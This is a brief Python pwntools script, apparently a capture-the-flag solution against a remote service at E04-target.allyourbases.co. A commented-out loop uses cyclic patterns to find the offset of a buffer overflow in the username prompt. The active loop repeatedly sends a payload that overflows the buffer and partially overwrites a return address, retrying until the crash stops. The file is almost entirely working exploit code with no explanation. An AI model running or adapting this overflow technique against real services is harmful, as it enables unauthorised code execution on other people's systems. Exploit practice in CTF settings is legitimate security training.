from pwn import *
# for x in range(20, 50):
#     with context.local(log_level = 'error'):
#         p = remote('E04-target.allyourbases.co', 8139)
#         p.sendlineafter(b'Username:', cyclic(x) + b'\x00')
#         res = p.recvlines(2)
#         print(x, res)
#         if res[-1] != b'You are not a member of this server.':
#             break
#         else:
#             p.close()

# 0xbd0cb6a
while True:
    with context.local(log_level = 'error'):
        p = remote('E04-target.allyourbases.co', 8139)
        p.sendlineafter(b'Username:', b'\x0b' + b'a'*(32) + b'\x6a\xcb\xd0')
        res=p.recvlines(2)
        print(res)
        if b'Segmentation' not in res[0]:
            break
        p.close()